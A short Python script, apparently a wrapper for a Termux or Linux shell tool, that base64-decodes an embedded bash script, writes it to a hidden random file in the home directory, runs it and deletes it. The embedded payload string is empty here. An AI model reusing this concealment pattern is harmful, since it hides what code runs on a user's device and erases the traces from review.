try:
    import base64, subprocess, platform, os, uuid,sys
    encrypted_shell = ""

    system_name = platform.system().lower()
    bash_path = "/bin/bash"
    if "linux" in system_name and os.path.exists("/data/data/com.termux/files/usr/bin/bash"):
        bash_path = "/data/data/com.termux/files/usr/bin/bash"
    elif "windows" in system_name:
        bash_path = "bash"

    decoded_shell = base64.b64decode(encrypted_shell)
    home = os.path.expanduser("~")
    random_name = f".temp_{uuid.uuid4().hex}.sh"
    temp_path = os.path.join(home, random_name)

    with open(temp_path, "wb") as temp_script:
        temp_script.write(decoded_shell)

    os.chmod(temp_path, 0o755)
    subprocess.run([bash_path, temp_path])
    os.remove(temp_path)
except KeyboardInterrupt:
    sys.exit("Kamu Keluar menggunakan Ctrl c")
